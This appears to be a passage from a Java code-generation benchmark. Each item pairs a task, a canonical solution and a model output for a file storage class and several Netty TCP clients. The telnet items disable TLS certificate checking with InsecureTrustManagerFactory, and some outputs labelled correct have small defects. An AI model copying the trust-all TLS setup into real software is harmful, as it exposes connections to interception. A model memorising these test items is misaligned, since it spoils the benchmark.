    "Canonical_solution": "import bt.data.StorageUnit;\nimport bt.net.buffer.ByteBufferView;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\nclass CachedOpenFile implements StorageUnit {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    CachedOpenFile(Path file, long capacity) {\n        try {\n            Path parent = file.getParent();\n            if (parent != null) {\n                Files.createDirectories(parent);\n            }\n            fc = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        } catch (IOException ex) {\n            throw new UncheckedIOException(\"Could not open file \" + file.toAbsolutePath(), ex);\n        }\n        this.capacity = capacity;\n    }\n\n    @Override\n    public int readBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to read past the end of file (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.read(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to read bytes (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.write(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBufferView buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return buffer.transferTo(fc, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public long capacity() {\n        return capacity;\n    }\n\n    @Override\n    public long size() {\n        ensureOpen();\n        try {\n            return fc.size();\n        } catch (IOException ex) {\n            throw new UncheckedIOException(ex);\n        }\n    }\n\n    public void flush() throws IOException {\n        if (fc.isOpen())\n            this.fc.force(false);\n    }\n\n    public void lockForIoOperation() {\n        this.lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        this.lock.readLock().unlock();\n    }\n\n    @Override\n    public void close() throws IOException {\n        lock.writeLock().lock();\n        try {\n            this.fc.close();\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    private void ensureOpen() {\n        if (!fc.isOpen()) {\n            throw new IllegalStateException(\"Cannot access a closed file.\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\npublic class CachedOpenFile implements AutoCloseable {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    public CachedOpenFile(Path file, long capacity) throws IOException {\n        Files.createDirectories(file.getParent());\n        this.fc = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        this.capacity = capacity;\n        if (this.fc.size() < capacity) {\n            this.fc.truncate(capacity);\n        }\n    }\n\n    public int readBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.readLock().lock();\n        try {\n            return fc.read(buffer, offset);\n        } finally {\n            lock.readLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.writeLock().lock();\n        try {\n            return fc.write(buffer, offset);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBufferView buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.writeLock().lock();\n        try {\n            return fc.write(buffer.getByteBuffer(), offset);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public long capacity() {\n        return capacity;\n    }\n\n    public long size() throws IOException {\n        ensureOpen();\n        return fc.size();\n    }\n\n    public void flush() throws IOException {\n        ensureOpen();\n        lock.writeLock().lock();\n        try {\n            fc.force(true);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public void lockForIoOperation() {\n        lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        lock.readLock().unlock();\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (fc.isOpen()) {\n            fc.close();\n        }\n    }\n\n    private void ensureOpen() throws IOException {\n        if (!fc.isOpen()) {\n            throw new IOException(\"File channel is closed\");\n        }\n    }\n}\n\ninterface ByteBufferView {\n    ByteBuffer getByteBuffer();\n}\n```"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server and handle echo messages.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified host and port, and handles incoming and outgoing messages through a custom handler. It manages network resources and ensures proper cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- EchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Initializes and starts the Netty client, establishes connection to the remote server, and manages the connection lifecycle. Throws Exception if any error occurs during the process",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, port))\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new EchoClientHandler());\n                    }\n                });\n            ChannelFuture f = b.connect().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new EchoClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle incoming data, and manage connection lifecycle.\n\nClass Description: The TimeClient class establishes and manages a non-blocking TCP connection to a specified server using Netty's NIO framework. It handles connection setup, message processing through a custom pipeline, and graceful shutdown of resources.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\nworkerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\nbootstrap: Bootstrap - Netty's client bootstrap for configuring and starting the client\n\nMethods:\nTimeClient(String host, int port) -> None - Constructor that initializes the client with target server details and creates necessary Netty components\nstart() -> void - Configures and starts the Netty client, establishes connection to server, and waits for connection closure\nstop() -> void - Shuts down the client gracefully by releasing all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new TimeDecoder());\n                            ch.pipeline().addLast(new TimeClientHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n    private final String host;\n    private final int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup)\n                 .channel(NioSocketChannel.class)\n                 .option(ChannelOption.SO_KEEPALIVE, true)\n                 .handler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) throws Exception {\n                         ch.pipeline().addLast(new TimeClientHandler());\n                     }\n                 });\n\n        try {\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: MyClient is a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly. The client uses custom encoders/decoders and handlers for message processing.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nconstructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\nrun: run() -> void - Main method that establishes the connection, sends periodic messages, and manages resources. Throws InterruptedException for thread-related operations\ninitChannel: initChannel(SocketChannel ch) -> void - Configures the channel pipeline with custom encoders, decoders, and handlers (internal method within ChannelInitializer)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                    ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\n\npublic class MyClient {\n    private final String host;\n    private final int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringEncoder(StandardCharsets.UTF_8));\n                            pipeline.addLast(new ClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            System.out.println(\"Connected to server at \" + host + \":\" + port);\n\n            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);\n            scheduler.scheduleAtFixedRate(() -> {\n                String poemLine = \"\u5c71\u91cd\u6c34\u590d\u7591\u65e0\u8def\uff0c\u67f3\u6697\u82b1\u660e\u53c8\u4e00\u6751\u3002\";\n                future.channel().writeAndFlush(Unpooled.copiedBuffer(poemLine, StandardCharsets.UTF_8));\n            }, 0, 5, TimeUnit.SECONDS);\n\n            future.channel().closeFuture().sync();\n            scheduler.shutdown();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ClientHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            System.out.println(\"Received from server: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a TCP client using Java Netty framework that can establish a secure/non-secure connection to a remote server, send messages from standard input, and gracefully handle connection termination.\n\nClass Description: TelnetClient is a Netty-based TCP client that connects to a specified host and port, supports SSL/TLS encryption when configured, and provides interactive message sending capability through standard input.\n\nAttributes:\nSSL: static final boolean - Flag indicating whether SSL/TLS encryption should be used\nHOST: static final String - The host address to connect to (default: \"127.0.0.1\")\nPORT: static final int - The port number to connect to (default: 8992 for SSL, 8023 for non-SSL)\n\nMethods:\nstart: void() throws Exception - Main method that initializes the Netty client, establishes connection, handles user input, and manages connection lifecycle\n  - Initializes SSL context if SSL is enabled\n  - Creates and configures Netty Bootstrap with NioEventLoopGroup\n  - Establishes connection to specified host and port\n  - Reads input from console and sends to server\n  - Handles graceful shutdown on \"bye\" command or connection close",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class TelnetClient {\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL ? \"8992\" : \"8023\"));\n\n    public static void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SslContext sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                b.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                        ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                        ch.pipeline().addLast(new StringDecoder());\n                    }\n                });\n            } else {\n                b.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                        ch.pipeline().addLast(new StringDecoder());\n                    }\n                });\n            }\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            Channel channel = f.channel();\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n                if (\"bye\".equals(line.toLowerCase())) {\n                    break;\n                }\n                channel.writeAndFlush(Unpooled.copiedBuffer((line + \"\\r\\n\").getBytes()));\n            }\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, send messages from standard input, and handle file operations.\n\nClass Description: The FileClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It configures the client pipeline with string encoders/decoders and a custom handler for file operations. The client continuously reads input from the console and sends it to the server.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\ndest: String - The destination path for file operations (used by the client handler)\n\nMethods:\nrun(): void - throws InterruptedException, IOException - Main method that initializes the Netty client, establishes connection, and handles message sending\n  - Input: None\n  - Output: None (but may throw InterruptedException or IOException)\n  \nFileClient(String, int, String) - Constructor that initializes the client with connection parameters\n  - Input:\n    - host: String - Server hostname/IP\n    - port: int - Server port\n    - dest: String - File destination path\n  - Output: FileClient instance (constructor)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n\n    private String host;\n    private int port;\n    private String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"encoder\", new StringEncoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(\"decoder\", new StringDecoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(new FileClientHandler(dest));\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            Channel channel = f.channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.codec.string.StringDecoder;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n    private final String host;\n    private final int port;\n    private final String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new StringDecoder());\n                            ch.pipeline().addLast(new StringEncoder());\n                            ch.pipeline().addLast(new FileClientHandler(dest));\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            Channel channel = future.channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            String line;\n            while ((line = in.readLine()) != null) {\n                if (line.trim().isEmpty()) continue;\n                channel.writeAndFlush(Unpooled.copiedBuffer(line + \"\\n\"));\n            }\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a Docker daemon, with support for SSL/TLS encryption and timeout handling.\n\nClass Description: The NettyTcpClient class provides functionality to establish and manage TCP connections to a Docker daemon using Netty framework. It handles connection initialization, SSL/TLS configuration, timeout management, and graceful shutdown.\n\nAttributes:\n- bootstrap: Bootstrap - Netty's client bootstrap for connection configuration\n- eventLoopGroup: EventLoopGroup - Manages client-side I/O threads\n- connectTimeout: Integer - Connection timeout in milliseconds\n- readTimeout: Integer - Read operation timeout in milliseconds\n- threadPrefix: String - Prefix for Netty thread names\n\nMethods:\n- init(DockerClientConfig dockerClientConfig) -> void - Initializes the Netty client with Docker configuration\n- connect(DockerClientConfig dockerClientConfig) -> DuplexChannel - Establishes connection to Docker daemon with SSL support\n- initSsl(DockerClientConfig dockerClientConfig) -> SslHandler - Configures SSL/TLS for the connection\n- enableHostNameVerification(SSLParameters sslParameters) -> SSLParameters - Enables hostname verification in SSL parameters\n- close() -> void - Shuts down the client gracefully\n- configure(T channel) -> T - Configures channel timeouts and handlers\n- ReadTimeoutHandler() -> void - Inner class handling read timeout events",
    "Canonical_solution": "import com.github.dockerjava.core.DockerClientConfig;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelConfig;\nimport io.netty.channel.ChannelFactory;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DuplexChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContentDecompressor;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultThreadFactory;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketTimeoutException;\nimport java.security.Security;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.SSLParameters;\n\npublic class NettyTcpClient {\n\n    private static String threadPrefix = \"dockerjava-netty\";\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n    private Integer connectTimeout;\n    private Integer readTimeout;\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        bootstrap = new Bootstrap();\n        eventLoopGroup = new NioEventLoopGroup(0, new DefaultThreadFactory(threadPrefix));\n\n        InetAddress addr = InetAddress.getLoopbackAddress();\n        final SocketAddress proxyAddress = new InetSocketAddress(addr, 8008);\n\n        Security.addProvider(new BouncyCastleProvider());\n\n        ChannelFactory<NioSocketChannel> factory = () -> configure(new NioSocketChannel());\n\n        bootstrap.group(eventLoopGroup).channelFactory(factory)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(final SocketChannel channel) 